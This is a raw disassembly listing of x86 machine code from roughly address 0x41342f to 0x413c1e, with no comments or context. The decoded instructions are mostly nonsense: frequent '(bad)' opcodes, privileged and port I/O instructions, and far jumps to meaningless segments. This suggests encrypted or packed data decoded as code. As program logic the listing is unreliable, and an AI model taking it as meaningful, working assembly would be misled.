  41342f:	fdivr  QWORD PTR [eax+0x72fce42c]
  413435:	and    BYTE PTR [edi-0x5c],0x7b
  413439:	fsub   DWORD PTR [ecx+ecx*8+0x6602fe12]
  413440:	ss mov edx,0x9e24c060
  413446:	cmp    BYTE PTR [edx+ecx*8+0x23],bl
  41344a:	and    DWORD PTR [eax-0x77],ecx
  41344d:	imul   DWORD PTR [ebp+ecx*1+0x3e3b7ffb]
  413454:	rcr    BYTE PTR [ebp+ecx*4-0x5281ba38],cl
  41345b:	sahf   
  41345c:	(bad)  
  41345d:	cmp    eax,0x1c0483e0
  413462:	sub    BYTE PTR [ebp+0x37],cl
  413465:	jns    0x41343d
  413467:	mov    dh,0xfc
  413469:	pop    edx
  41346a:	add    edi,ebx
  41346c:	pop    ss
  41346d:	fldcw  WORD PTR [edi]
  41346f:	and    BYTE PTR [edi+0x70],cl
  413472:	inc    esp
  413473:	jl     0x413406
  413475:	arpl   WORD PTR [edi-0x65],ax
  413478:	sub    BYTE PTR [edx+esi*8+0x6b],bh
  41347c:	leave  
  41347d:	cmp    bl,bl
  41347f:	push   es
  413480:	jg     0x41349f
  413482:	mov    al,ds:0x7622625
  413487:	lds    esp,FWORD PTR [esi-0x5]
  41348a:	popa   
  41348b:	es mov edx,0xab2822df
  413491:	or     eax,0x8c8a2303
  413496:	xor    BYTE PTR [ebx-0x18],al
  413499:	sub    al,0xe3
  41349b:	jo     0x4134af
  41349d:	jo     0x4134ca
  41349f:	fdivp  st(0),st
  4134a1:	popf   
  4134a2:	mov    edx,0x10cfc782
  4134a7:	add    DWORD PTR [eax+0x67e78153],edi
  4134ad:	cmp    BYTE PTR [ebx+edx*8+0x80038b7],bl
  4134b4:	and    ebx,DWORD PTR [edi+ebx*4+0x2d68464b]
  4134bb:	stos   BYTE PTR es:[edi],al
  4134bc:	mov    BYTE PTR [eax],dh
  4134be:	cmp    ecx,DWORD PTR [ebx+0x396167b0]
  4134c4:	mov    ds:0xe25cc959,eax
  4134c9:	imul   eax,DWORD PTR [edi+0x677dd1be],0xffffffc7
  4134d0:	pop    esp
  4134d1:	cmp    eax,0xc9628c29
  4134d6:	aaa    
  4134d7:	pop    esi
  4134d8:	mov    dl,0x56
  4134da:	push   eax
  4134db:	sub    DWORD PTR [edx-0x48],ecx
  4134de:	push   edx
  4134df:	push   esi
  4134e0:	or     eax,0x9e13ca6d
  4134e5:	iret   
  4134e6:	repz ret 0xac99
  4134ea:	mov    ebp,eax
  4134ec:	mov    esp,0x9d5acd56
  4134f1:	leave  
  4134f2:	mov    ss,ebp
  4134f4:	mov    esp,0xf2cf0966
  4134f9:	add    al,0x10
  4134fb:	adc    DWORD PTR [ecx-0x31b3a313],eax
  413501:	push   eax
  413502:	dec    ebx
  413503:	sahf   
  413504:	lods   al,BYTE PTR ds:[esi]
  413505:	xchg   BYTE PTR [ecx],ch
  413507:	dec    ecx
  413508:	jb     0x4134f0
  41350a:	add    DWORD PTR [eax+eax*2+0x72],edx
  41350e:	xor    al,0xaf
  413510:	push   edi
  413511:	xchg   BYTE PTR [eax-0x58],ch
  413514:	xchg   ebp,eax
  413515:	out    dx,eax
  413516:	mov    esp,0xf1c3b64
  41351b:	pop    ebx
  41351c:	iret   
  41351d:	mov    ah,0x3f
  41351f:	dec    esp
  413520:	rcl    BYTE PTR [ecx-0x50b05cc5],0xb5
  413527:	out    0x95,eax
  413529:	cli    
  41352a:	cmp    esp,ecx
  41352c:	push   0xffffffdb
  41352e:	mov    ecx,0x12553e92
  413533:	push   eax
  413534:	test   DWORD PTR gs:[edx-0x4b8e3f0a],ebp
  41353b:	daa    
  41353c:	aad    0x1a
  41353e:	das    
  41353f:	sbb    DWORD PTR [edi+edi*8-0x7b],ebx
  413543:	cmp    DWORD PTR [edi],eax
  413545:	xchg   esi,eax
  413546:	adc    al,0x23
  413548:	cdq    
  413549:	mov    ds:0xfe51d14,eax
  41354e:	and    edx,esp
  413550:	and    eax,0xc49ed52b
  413555:	ret    0x8984
  413558:	jmp    0x4134db
  41355a:	cmp    al,0xf6
  41355c:	pushf  
  41355d:	or     al,0xb0
  41355f:	bound  esi,QWORD PTR [esi]
  413561:	sub    ecx,eax
  413563:	jmp    0x461d:0xf17b6be2
  41356a:	shr    DWORD PTR gs:[edx+0x41],1
  41356e:	mov    edx,0xfce36ef7
  413573:	sysret 
  413575:	(bad)  
  413576:	rcr    bh,cl
  413578:	or     esp,DWORD PTR [ebp-0x571d12ca]
  41357e:	fnstsw WORD PTR [ebx-0x4b578095]
  413584:	pusha  
  413585:	sub    al,0x1e
  413587:	xor    ecx,DWORD PTR [ecx]
  413589:	stc    
  41358a:	fistp  WORD PTR [eax-0x3c]
  41358d:	dec    esp
  41358e:	push   es
  41358f:	xchg   edx,eax
  413590:	fdiv   QWORD PTR [esi+ebp*8+0x4a]
  413594:	add    dl,BYTE PTR [esi-0x28069fa5]
  41359a:	and    BYTE PTR [edx+0x4f2a701e],bh
  4135a0:	fcom   QWORD PTR [eax]
  4135a2:	sub    eax,0x6a9bed89
  4135a7:	fild   DWORD PTR [esi+edx*4-0x30]
  4135ab:	pop    edi
  4135ac:	dec    esp
  4135ad:	add    ah,BYTE PTR [esi+0x460fc36]
  4135b3:	jecxz  0x413593
  4135b5:	add    DWORD PTR [esi],ebp
  4135b7:	stos   BYTE PTR es:[edi],al
  4135b8:	fidivr DWORD PTR [edi-0x5]
  4135bb:	mov    dl,0x1e
  4135bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135be:	dec    ebx
  4135bf:	or     al,0x63
  4135c1:	add    eax,0xa2238561
  4135c6:	inc    esi
  4135c7:	cs retf 
  4135c9:	enter  0xc4e7,0xbc
  4135cd:	nop
  4135ce:	jp     0x413577
  4135d0:	push   esi
  4135d1:	xchg   edi,eax
  4135d2:	push   ds
  4135d3:	add    eax,0x4e7e461e
  4135d8:	loopne 0x413625
  4135da:	fisttp DWORD PTR [ebx+0x66]
  4135dd:	xchg   ebp,eax
  4135de:	inc    edi
  4135df:	sbb    DWORD PTR [esi+0x5ab2cf7f],esi
  4135e5:	fldenv [ecx]
  4135e7:	leave  
  4135e8:	jmp    0xafd5:0xa23932e0
  4135ef:	(bad)  
  4135f0:	js     0x4135bc
  4135f2:	rol    BYTE PTR [ebx+0x43be8078],cl
  4135f8:	arpl   WORD PTR [esi+0x4],dx
  4135fb:	lds    esp,FWORD PTR [eax+0x21]
  4135fe:	and    esp,DWORD PTR [eax-0x50]
  413601:	push   ds
  413602:	mov    edx,0x6c252dee
  413607:	sbb    ebx,esi
  413609:	or     al,0xd2
  41360b:	sti    
  41360c:	dec    ecx
  41360d:	lea    ebp,[edx-0x4e]
  413610:	ret    0xc32f
  413613:	std    
  413614:	scas   al,BYTE PTR es:[edi]
  413615:	jl     0x41365a
  413617:	icebp  
  413618:	push   esi
  413619:	out    dx,eax
  41361a:	test   cl,ah
  41361c:	in     eax,0x8e
  41361e:	fistp  QWORD PTR [ebx+esi*2]
  413621:	pop    eax
  413622:	mov    BYTE PTR [eax],dh
  413624:	mov    ds:0x8e23f9d7,eax
  413629:	jmp    0x4135ab
  41362b:	mov    BYTE PTR [esi-0x80],dh
  41362e:	ret    
  41362f:	mov    cl,0xca
  413631:	pop    ecx
  413632:	call   0xcd33:0xa7626df2
  413639:	test   BYTE PTR [eax+0x2f3eb258],cl
  41363f:	push   0x7e845617
  413644:	(bad)  [ebp+0x7a5520ef]
  41364a:	inc    ebx
  41364b:	add    BYTE PTR [eax-0x601b7172],ch
  413651:	lods   al,BYTE PTR ds:[esi]
  413652:	mov    ecx,0x9f8f8ef0
  413657:	xor    bl,bh
  413659:	mov    esi,ecx
  41365b:	fmul   QWORD PTR [ebx+ebx*1-0x76b24852]
  413662:	adc    al,0x7c
  413664:	cmc    
  413665:	lock jle 0x413637
  413668:	adc    edi,ebx
  41366a:	cwde   
  41366b:	dec    esi
  41366c:	mov    ecx,0x94bf5c15
  413671:	xchg   edi,eax
  413672:	loope  0x4136b1
  413674:	clc    
  413675:	lahf   
  413676:	div    ebx
  413678:	inc    esi
  413679:	iret   
  41367a:	xor    eax,0xbfa669ce
  41367f:	mov    dl,0xee
  413681:	push   edi
  413682:	xchg   ebp,eax
  413683:	ins    DWORD PTR es:[edi],dx
  413684:	jae    0x413634
  413686:	xor    bl,BYTE PTR [ebx+0x3f]
  413689:	je     0x41363d
  41368b:	nop
  41368c:	gs adc eax,0x2b6c43c3
  413692:	add    dh,0x24
  413695:	xor    DWORD PTR [esi],0x1bb1e037
  41369b:	fnstcw WORD PTR [si+0x24cd]
  4136a0:	mov    ebx,0xfdab6754
  4136a5:	pop    ds
  4136a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136a7:	mov    edx,0x6d27e070
  4136ac:	clc    
  4136ad:	jmp    0x413645
  4136af:	je     0x413647
  4136b1:	sub    BYTE PTR [ebx],al
  4136b3:	push   edi
  4136b4:	cmp    eax,0x1623d8b4
  4136b9:	xchg   ebp,eax
  4136ba:	aaa    
  4136bb:	cli    
  4136bc:	stc    
  4136bd:	cs ja  0x41370d
  4136c0:	mov    al,ds:0x8034ac45
  4136c5:	jno    0x413651
  4136c7:	pop    edi
  4136c8:	imul   ebp,edi,0x11
  4136cb:	test   DWORD PTR [eax+ecx*1-0x1c],esp
  4136cf:	and    ah,ah
  4136d1:	fs and eax,0x428a22c7
  4136d7:	leave  
  4136d8:	and    ebp,DWORD PTR [ecx-0x3655a2e6]
  4136de:	adc    bh,ch
  4136e0:	rcl    ecx,0x22
  4136e3:	mov    dh,0x10
  4136e5:	cmp    DWORD PTR [ebp+0x1d],ebx
  4136e8:	jnp    0x413718
  4136ea:	jp     0x4136a0
  4136ec:	ffree  st(6)
  4136ee:	outs   dx,BYTE PTR ds:[esi]
  4136ef:	or     ebp,DWORD PTR [ecx-0x49]
  4136f2:	loop   0x4136e3
  4136f4:	icebp  
  4136f5:	mov    al,ds:0x7c38c332
  4136fa:	mul    BYTE PTR [esi-0x1a]
  4136fd:	psadbw mm6,QWORD PTR [esi]
  413700:	aaa    
  413701:	stc    
  413702:	inc    ecx
  413703:	adc    BYTE PTR [edx+0x1d92b5],bh
  413709:	mov    edx,0xaf5dd93e
  41370e:	les    esp,FWORD PTR [edi-0x64]
  413711:	aaa    
  413712:	mov    DWORD PTR ds:0x1677a8c6,edx
  413718:	mov    dl,al
  41371a:	mov    ds:0x5485c99f,eax
  41371f:	cmc    
  413720:	std    
  413721:	sahf   
  413722:	lods   al,BYTE PTR ds:[esi]
  413723:	js     0x41377a
  413725:	(bad)  
  413726:	retf   
  413727:	push   edi
  413728:	or     eax,eax
  41372a:	add    eax,DWORD PTR [ecx-0x3eaa5521]
  413730:	pop    ebx
  413731:	push   ecx
  413732:	call   0x101a:0x60e13d60
  413739:	out    dx,al
  41373a:	ret    
  41373b:	int3   
  41373c:	jnp    0x4137a0
  41373e:	sbb    al,0x90
  413740:	jp     0x413727
  413742:	(bad)  
  413743:	push   ecx
  413744:	xor    bh,BYTE PTR [ecx+0x1e]
  413747:	in     eax,0x8e
  413749:	push   ebx
  41374a:	leave  
  41374b:	cdq    
  41374c:	dec    edx
  41374d:	jg     0x4136f4
  41374f:	test   edi,ebp
  413751:	jmp    0x41371f
  413753:	xor    DWORD PTR [ebp-0x55],0x9483710c
  41375a:	cmp    al,0x4f
  41375c:	dec    esi
  41375d:	imul   edi,esp,0xffffffd1
  413760:	mov    ebx,0xa4ed89cb
  413765:	inc    esp
  413766:	stos   DWORD PTR es:[edi],eax
  413767:	cli    
  413768:	xor    al,0x9a
  41376a:	dec    edi
  41376b:	sub    al,0x1b
  41376d:	mov    al,0xa
  41376f:	push   eax
  413770:	push   ebx
  413771:	jo     0x4137c9
  413773:	outs   dx,BYTE PTR ss:[esi]
  413775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413776:	fistp  QWORD PTR [eax+0x4eb34e44]
  41377c:	jp     0x4137eb
  41377e:	pavgb  mm0,QWORD PTR [edi+0x12]
  413782:	ins    BYTE PTR es:[edi],dx
  413783:	scas   al,BYTE PTR es:[edi]
  413784:	pop    edi
  413785:	mov    WORD PTR [edi+edi*2-0x2a8d1d6a],es
  41378c:	add    ebx,DWORD PTR [esp+edx*8]
  41378f:	xor    BYTE PTR [edi],dl
  413791:	shl    DWORD PTR [edx],0xf2
  413794:	out    0x67,eax
  413796:	std    
  413797:	rol    BYTE PTR [esi+0x50dad802],cl
  41379d:	push   cs
  41379e:	popa   
  41379f:	fs out 0x5a,eax
  4137a2:	add    esp,DWORD PTR [ecx-0x32]
  4137a5:	stos   BYTE PTR es:[edi],al
  4137a6:	retf   0x2933
  4137a9:	imul   edx,DWORD PTR [ebx+0x69],0x53
  4137ad:	mov    edx,0xa51af6d6
  4137b2:	rol    DWORD PTR [ebx+0x3424fee9],cl
  4137b8:	jg     0x41380c
  4137ba:	lds    ecx,FWORD PTR [ebx]
  4137bc:	mov    ds:0x11f8b007,al
  4137c1:	ja     0x413833
  4137c3:	mov    dh,0x3e
  4137c5:	pop    esi
  4137c6:	pop    edi
  4137c7:	xor    eax,0x53e9359
  4137cc:	enter  0x9ba6,0xd8
  4137d0:	cmp    ah,BYTE PTR [ebp+0x681ff6cb]
  4137d6:	adc    DWORD PTR [ecx-0x5d6cca0],eax
  4137dc:	add    cl,BYTE PTR [ecx-0x33]
  4137df:	pop    ds
  4137e0:	sbb    esi,eax
  4137e2:	fisttp WORD PTR [edx]
  4137e4:	dec    esp
  4137e5:	adc    BYTE PTR [ebx-0x22],0xd4
  4137e9:	cwde   
  4137ea:	or     BYTE PTR [edi],bl
  4137ec:	jb     0x413869
  4137ee:	test   bl,dl
  4137f0:	add    eax,0xd2d3e055
  4137f5:	(bad)  
  4137f6:	adc    edi,DWORD PTR [ebp-0x5d]
  4137f9:	aad    0xe
  4137fb:	adc    BYTE PTR ds:0x1ae240a4,ah
  413801:	add    eax,0xb4ba9f6c
  413806:	stc    
  413807:	and    eax,0x894aeb0d
  41380c:	push   ss
  41380d:	leave  
  41380e:	and    al,0xb0
  413810:	jne    0x4137d1
  413812:	and    DWORD PTR [esi+edx*2+0x1b],ebx
  413816:	mov    dl,0x27
  413818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413819:	push   es
  41381a:	arpl   WORD PTR [ecx],sp
  41381c:	scas   al,BYTE PTR es:[edi]
  41381d:	in     al,0x60
  41381f:	stos   BYTE PTR es:[edi],al
  413820:	int    0x44
  413822:	jne    0x41381a
  413824:	xchg   DWORD PTR [ebp+0x31],ebp
  413827:	iret   
  413828:	mov    al,ds:0x93897727
  41382d:	fidivr DWORD PTR [eax]
  41382f:	xchg   ecx,eax
  413830:	imul   eax,DWORD PTR [ecx+0x56d5b781],0x1a1961de
  41383a:	mov    BYTE PTR [ebp-0x64e818ef],dh
  413840:	call   0xd0aac727
  413845:	pop    ss
  413846:	cmp    BYTE PTR ds:0xc7b41eed,ch
  41384c:	in     eax,0xc8
  41384e:	jnp    0x4138c2
  413850:	aad    0x3a
  413852:	int3   
  413853:	(bad)  
  413855:	jno    0x41382e
  413857:	cs ins BYTE PTR es:[edi],dx
  413859:	loopne 0x41382d
  41385b:	xchg   DWORD PTR [ebx+eax*8-0x518c4f28],edi
  413862:	push   ebp
  413863:	ja     0x4138b9
  413865:	push   es
  413866:	pop    ds
  413867:	push   es
  413868:	dec    edi
  413869:	mov    BYTE PTR [ecx+0x3f],ch
  41386c:	aas    
  41386d:	mov    dl,0xc7
  41386f:	xchg   ebp,eax
  413870:	and    BYTE PTR [ecx],0x84
  413873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413874:	loope  0x413833
  413876:	mov    eax,0x4ca9b31c
  41387b:	and    eax,0xa592a7f
  413880:	mov    ecx,0x670ba037
  413885:	and    BYTE PTR [edi+eax*1+0x40431b00],0xe4
  41388d:	fs fs inc esp
  413890:	adc    al,0x83
  413892:	mov    al,0xb9
  413894:	inc    ebx
  413895:	sub    DWORD PTR [ecx+ebx*4-0x5b5ef6a3],edi
  41389c:	sub    DWORD PTR [ebx],edx
  41389e:	push   ss
  41389f:	or     ebp,DWORD PTR [edx+0x6874ca4d]
  4138a5:	push   0xf0bfa06f
  4138aa:	jno    0x413929
  4138ac:	dec    esp
  4138ad:	test   eax,0xc387274f
  4138b2:	int3   
  4138b3:	xor    al,0xb6
  4138b5:	xchg   ebp,eax
  4138b6:	and    DWORD PTR [ebp-0x70],0xaa1a98d6
  4138bd:	push   edi
  4138be:	pop    ebx
  4138bf:	sbb    al,BYTE PTR [eax+0x1e97f0b3]
  4138c5:	std    
  4138c6:	sbb    eax,0xbc4935ae
  4138cb:	add    cl,dl
  4138cd:	(bad)  
  4138ce:	pop    eax
  4138cf:	aam    0xd9
  4138d1:	retf   0x529b
  4138d4:	daa    
  4138d5:	daa    
  4138d6:	fwait
  4138d7:	mov    eax,0x21728e74
  4138dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138dd:	or     al,0xbb
  4138df:	mov    DWORD PTR [ecx-0x378d4637],edi
  4138e5:	fwait
  4138e6:	ds dec eax
  4138e8:	jno    0x4138e4
  4138ea:	mov    al,0xf0
  4138ec:	xlat   BYTE PTR ds:[ebx]
  4138ed:	fcmovbe st,st(2)
  4138ef:	push   es
  4138f0:	and    dl,BYTE PTR [ebp-0x76]
  4138f3:	pusha  
  4138f4:	mov    bh,0xce
  4138f6:	fmul   QWORD PTR [edx-0x3a]
  4138f9:	lods   eax,DWORD PTR ds:[esi]
  4138fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138fb:	cmp    ecx,DWORD PTR [ebp+0x63d77eb7]
  413901:	mov    eax,ds:0x9ab19a6b
  413906:	imul   DWORD PTR [ecx+0x51b3b2da]
  41390c:	out    dx,al
  41390d:	mov    ah,0xea
  41390f:	or     al,0xea
  413911:	(bad)  
  413912:	ja     0x4138ff
  413914:	adc    DWORD PTR [edx+0x230aa3d3],esi
  41391a:	jae    0x413979
  41391c:	arpl   si,bp
  41391e:	retf   0xe6b9
  413921:	mov    cl,0x51
  413923:	inc    esp
  413924:	mov    esi,DWORD PTR [ebx]
  413926:	outs   dx,DWORD PTR ds:[esi]
  413927:	or     al,0x62
  413929:	in     eax,dx
  41392a:	sbb    eax,0xf43c52f4
  41392f:	or     eax,0x6e221154
  413934:	test   BYTE PTR [edx+0x28157e47],0xe0
  41393b:	xchg   bh,ch
  41393d:	fst    st(1)
  41393f:	xor    dl,BYTE PTR [ecx+0x27e81f00]
  413945:	test   DWORD PTR [esi+ebp*2-0x1f21d378],edx
  41394c:	push   0x30
  41394e:	mov    esi,DWORD PTR [eax]
  413950:	cmp    eax,0x55626232
  413955:	push   cs
  413956:	mov    ecx,0xcf7a58dc
  41395b:	je     0x4139d8
  41395d:	ja     0x413977
  41395f:	xor    BYTE PTR [edi],ch
  413961:	ins    DWORD PTR es:[edi],dx
  413962:	loop   0x41393b
  413964:	jl     0x41393d
  413966:	push   0x19b1254a
  41396b:	add    ebp,DWORD PTR [esi+0x79]
  41396e:	int3   
  41396f:	pop    ebx
  413970:	ret    0x3285
  413973:	jno    0x413999
  413975:	out    0x43,eax
  413977:	push   edi
  413978:	mov    cl,0x86
  41397a:	push   ecx
  41397b:	imul   ebx,DWORD PTR [edx],0x4bd373ea
  413981:	sub    bh,dh
  413983:	mov    eax,ds:0x338e8810
  413988:	out    0xc5,al
  41398a:	sar    BYTE PTR [ebp-0x1e0be04],1
  413990:	lods   eax,DWORD PTR ds:[esi]
  413991:	ds push es
  413993:	mov    ebp,0xb447d92b
  413998:	and    cl,BYTE PTR [ebp-0x27da2124]
  41399e:	nop
  41399f:	std    
  4139a0:	std    
  4139a1:	and    al,0x57
  4139a3:	pop    edx
  4139a4:	inc    edx
  4139a5:	and    eax,0xd4baab89
  4139aa:	push   ebx
  4139ab:	xor    DWORD PTR [edi+0x33c28b82],edx
  4139b1:	or     al,ah
  4139b3:	bound  eax,QWORD PTR [eax]
  4139b5:	mov    cl,0x89
  4139b7:	rol    BYTE PTR [ebp-0x66f5c942],cl
  4139bd:	jns    0x413952
  4139bf:	cld    
  4139c0:	fld    st(3)
  4139c2:	dec    ebx
  4139c3:	fst    QWORD PTR [eax+0x3c]
  4139c6:	sub    eax,0x65aa3654
  4139cb:	ss push esp
  4139cd:	retf   
  4139ce:	movaps xmm3,xmm4
  4139d1:	ins    DWORD PTR es:[di],dx
  4139d3:	sbb    eax,0xfea6740a
  4139d8:	scas   al,BYTE PTR es:[edi]
  4139d9:	cmp    DWORD PTR [ebx-0x65],ebx
  4139dc:	xchg   ecx,eax
  4139dd:	push   DWORD PTR [eax+0x5a2d2849]
  4139e3:	jbe    0x4139cc
  4139e5:	pop    es
  4139e6:	push   ds
  4139e7:	lds    eax,FWORD PTR [eax]
  4139e9:	mov    cl,0x1
  4139eb:	in     al,dx
  4139ec:	out    dx,eax
  4139ed:	pop    ds
  4139ee:	mov    cs,WORD PTR [esi+0x6d4dbe40]
  4139f4:	int    0xe7
  4139f6:	inc    esi
  4139f7:	xchg   ebp,eax
  4139f8:	push   esi
  4139f9:	(bad)  
  4139fa:	icebp  
  4139fb:	add    eax,esp
  4139fd:	test   BYTE PTR [esi+0x3a],0xce
  413a01:	cs jecxz 0x4139b8
  413a04:	mov    ah,BYTE PTR [edi-0x16]
  413a07:	icebp  
  413a08:	adc    ebx,DWORD PTR [esi-0x69b71399]
  413a0e:	(bad)  
  413a10:	or     BYTE PTR [edi-0x265e92b0],ah
  413a16:	or     eax,0x1fd62022
  413a1b:	dec    ecx
  413a1c:	push   es
  413a1d:	xchg   edi,eax
  413a1e:	mov    cs,esi
  413a20:	xor    dl,dh
  413a22:	fist   DWORD PTR [edi+edx*2]
  413a25:	sbb    BYTE PTR [ebx+esi*4],bl
  413a28:	enter  0xf83a,0xef
  413a2c:	pop    esi
  413a2d:	push   0xe5d01785
  413a32:	aad    0x80
  413a34:	xchg   BYTE PTR [ebp-0x92eb90f],ah
  413a3a:	jne    0x413a23
  413a3c:	push   ebp
  413a3d:	or     DWORD PTR [edi],ebx
  413a3f:	iret   
  413a40:	ins    DWORD PTR es:[edi],dx
  413a41:	out    0xa3,eax
  413a43:	cdq    
  413a44:	pop    ds
  413a45:	xchg   esi,eax
  413a46:	pop    ss
  413a47:	xchg   ebp,eax
  413a48:	adc    edx,DWORD PTR ds:0x88e35a6b
  413a4e:	inc    eax
  413a4f:	jp     0x413ab4
  413a51:	or     DWORD PTR [eax],ebp
  413a53:	jp     0x413a2e
  413a55:	fwait
  413a56:	jl     0x413a60
  413a58:	nop
  413a59:	cmp    BYTE PTR [esi-0x1bcca265],ah
  413a5f:	cmp    DWORD PTR [ebp+0x5d],esp
  413a62:	jo     0x413ace
  413a64:	rcl    BYTE PTR [bx+0x74d0],1
  413a69:	jp     0x413a66
  413a6b:	pusha  
  413a6c:	pushf  
  413a6d:	and    al,0x4b
  413a6f:	inc    edi
  413a70:	xchg   esi,edi
  413a72:	stc    
  413a73:	and    BYTE PTR [eax+0x25],dl
  413a76:	hlt    
  413a77:	xchg   cl,dh
  413a79:	int    0x54
  413a7b:	push   0x98cf88b5
  413a80:	mov    ch,0xcd
  413a82:	arpl   WORD PTR [esi+0x4a1d06fd],bp
  413a88:	jae    0x413aa5
  413a8a:	pop    ebx
  413a8b:	aaa    
  413a8c:	mov    eax,ds:0x16a2ddd3
  413a91:	jnp    0x413aa3
  413a93:	(bad)  [ebx+0x34]
  413a96:	test   BYTE PTR [ebp+0x60b1fed],bh
  413a9c:	icebp  
  413a9d:	xchg   DWORD PTR [esi-0x7f6091ca],ecx
  413aa3:	cdq    
  413aa4:	mov    edi,ebp
  413aa6:	icebp  
  413aa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aa8:	sbb    al,0x54
  413aaa:	push   edi
  413aab:	in     eax,dx
  413aac:	jg     0x413aab
  413aae:	popa   
  413aaf:	cmp    edi,DWORD PTR [ebx+0x1512adb4]
  413ab5:	aaa    
  413ab6:	or     al,0x72
  413ab8:	jle    0x413b07
  413aba:	sub    dh,BYTE PTR [edi]
  413abc:	jecxz  0x413b30
  413abe:	lock cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413ac1:	mov    ecx,0x1a2f5947
  413ac6:	(bad)  
  413ac7:	fstp   QWORD PTR [eax+edx*2+0x6a]
  413acb:	ror    dl,1
  413acd:	stc    
  413ace:	(bad)  
  413ad0:	cmp    esp,edx
  413ad2:	pop    es
  413ad3:	push   esp
  413ad4:	sbb    eax,0x8378f709
  413ad9:	cmp    al,0xc1
  413adb:	test   BYTE PTR [esi+edx*1-0x3705c682],bh
  413ae2:	hlt    
  413ae3:	mov    dl,BYTE PTR [ebx-0xb9b749a]
  413ae9:	(bad)  
  413aea:	jae    0x413b02
  413aec:	iret   
  413aed:	add    ah,bh
  413aef:	out    0x39,eax
  413af1:	out    dx,al
  413af2:	mov    bh,0x2e
  413af4:	rcr    DWORD PTR [edi-0x6b037e14],0xe1
  413afb:	arpl   WORD PTR [ebx],si
  413afd:	ror    BYTE PTR [edi+0x7d205f58],0xd4
  413b04:	cmp    ch,BYTE PTR [edx-0x67180206]
  413b0a:	mov    al,0x68
  413b0c:	inc    ecx
  413b0d:	cs sti 
  413b0f:	push   0x13
  413b11:	push   cs
  413b12:	in     al,dx
  413b13:	xor    DWORD PTR [esi],esi
  413b15:	jl     0x413b03
  413b17:	lea    eax,[edi-0x4b]
  413b1a:	ficomp WORD PTR [esi-0x17dde57f]
  413b20:	xor    al,0xdc
  413b22:	ror    BYTE PTR [eax],cl
  413b24:	(bad)  
  413b25:	push   cs
  413b26:	stos   BYTE PTR es:[edi],al
  413b27:	jl     0x413aad
  413b29:	inc    ecx
  413b2a:	jmp    0x469d32a6
  413b2f:	mov    esp,0xc5468118
  413b34:	aam    0x1a
  413b36:	or     DWORD PTR [ecx],ebp
  413b38:	repnz adc edx,DWORD PTR [edi]
  413b3b:	xchg   ecx,eax
  413b3c:	aam    0xee
  413b3e:	xchg   ecx,eax
  413b3f:	mov    edi,0xb6b509e4
  413b44:	daa    
  413b45:	or     dh,BYTE PTR [ecx+0x6cd8638b]
  413b4b:	pop    ecx
  413b4c:	xlat   BYTE PTR ds:[ebx]
  413b4d:	pusha  
  413b4e:	test   al,0xf3
  413b50:	fstp   TBYTE PTR [ebp+0x4e5ce648]
  413b56:	xor    DWORD PTR [esi+0x61],ebp
  413b59:	ret    
  413b5a:	add    eax,esp
  413b5c:	loop   0x413b68
  413b5e:	lods   eax,DWORD PTR ds:[si]
  413b60:	sub    eax,0xfb8db895
  413b65:	pop    eax
  413b66:	std    
  413b67:	ins    DWORD PTR es:[edi],dx
  413b68:	sbb    esp,DWORD PTR [ebp-0x71]
  413b6b:	stos   DWORD PTR es:[edi],eax
  413b6c:	retf   
  413b6d:	add    BYTE PTR [edx+0x2eb1aaf3],ch
  413b73:	inc    ebp
  413b74:	aaa    
  413b75:	inc    ebp
  413b76:	jmp    0x413bc9
  413b78:	inc    edi
  413b79:	loop   0x413b1e
  413b7b:	scas   eax,DWORD PTR es:[edi]
  413b7c:	imul   edx,DWORD PTR [edx+0x5a],0x3d
  413b80:	mov    esi,0x74044143
  413b85:	or     ebp,DWORD PTR [edi+edx*8-0x64]
  413b89:	aam    0x2
  413b8b:	push   ds
  413b8c:	push   edx
  413b8d:	jge    0x413ba2
  413b8f:	xchg   ebx,eax
  413b90:	into   
  413b91:	xor    dl,bl
  413b93:	dec    edx
  413b94:	arpl   WORD PTR [ebx-0x28],ax
  413b97:	shl    ah,cl
  413b99:	sub    BYTE PTR [ecx],al
  413b9b:	inc    ebp
  413b9c:	push   ds
  413b9d:	push   0xaebb1eee
  413ba2:	add    BYTE PTR [ebx-0x7779322],ah
  413ba8:	(bad)  
  413ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413baa:	mov    ds,WORD PTR [esi+0x31]
  413bad:	xor    DWORD PTR ds:0x4184fc9f,0x61
  413bb4:	loopne 0x413bc4
  413bb6:	xor    bh,dl
  413bb8:	call   0xdc27:0x5a3f7246
  413bbf:	test   al,0x6
  413bc1:	jnp    0x413b4a
  413bc3:	sbb    al,0xc8
  413bc5:	add    ecx,DWORD PTR [eax+0x46]
  413bc8:	data16 loopne 0x413c31
  413bcb:	dec    esp
  413bcc:	(bad)  
  413bcd:	xor    eax,0xc1fe481a
  413bd2:	pop    ebp
  413bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd4:	add    al,0x5b
  413bd6:	adc    eax,0xe9815b77
  413bdb:	adc    eax,0x79ca3010
  413be0:	shl    dh,1
  413be2:	add    DWORD PTR [eax],esp
  413be4:	mov    bh,al
  413be6:	adc    ah,bh
  413be8:	repz call 0xd423:0xcdde29cb
  413bf0:	cmp    esp,DWORD PTR [ecx]
  413bf2:	sub    esp,DWORD PTR [ebp+0x14]
  413bf5:	test   BYTE PTR [edx+edi*8+0x78],dl
  413bf9:	fbstp  TBYTE PTR [edx]
  413bfb:	fwait
  413bfc:	rcr    ah,0x5
  413bff:	leave  
  413c00:	ja     0x413bc1
  413c02:	inc    eax
  413c03:	in     eax,0x10
  413c05:	push   0x5d
  413c07:	xor    DWORD PTR [ebx],edi
  413c09:	jle    0x413bc8
  413c0b:	out    0xd6,al
  413c0d:	xchg   edx,eax
  413c0e:	sbb    BYTE PTR [eax+esi*8+0xd5580a7],al
  413c15:	pop    ebp
  413c16:	inc    esi
  413c17:	jnp    0x413bf1
  413c19:	arpl   WORD PTR [eax+0x3f],si
  413c1c:	cs stos DWORD PTR es:[edi],eax
  413c1e:	jne    0x413c27
